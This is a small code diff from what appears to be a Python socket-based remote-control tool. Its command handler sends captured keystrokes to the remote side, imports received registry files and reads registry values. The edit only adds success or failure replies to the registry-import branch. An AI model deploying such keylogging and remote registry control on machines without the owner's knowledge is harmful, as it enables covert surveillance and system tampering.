@@ -104,7 +104,10 @@ class SocketServer(SC.Socket):
             self.Send(keylog.get_key())
         elif msg == 'import':
             data = self.Receive()
-            registry.import_filereg(data)
+            if registry.import_filereg(data) == True:
+                self.Send('Successful fix')
+            else:
+                self.Send('Fail fix')
         elif msg[0] == 'Get value':
             data = registry.getValue(msg[1],msg[2])
             self.Send(data)
